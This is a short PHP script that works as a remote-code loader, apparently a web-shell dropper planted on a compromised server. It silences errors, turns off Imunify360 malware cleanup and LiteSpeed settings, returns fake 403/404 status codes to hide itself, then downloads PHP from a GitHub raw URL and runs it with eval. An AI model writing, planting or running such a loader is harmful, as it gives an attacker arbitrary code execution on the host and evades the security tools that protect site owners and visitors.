<?php
session_start();
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);

// Directly include and execute the content from the URL
$url = 'https://raw.githubusercontent.com/malcolmmamalnach/miloud-II/main/php.php';
$nomi = file_get_contents($url);
eval('?>' . $nomi);
?>
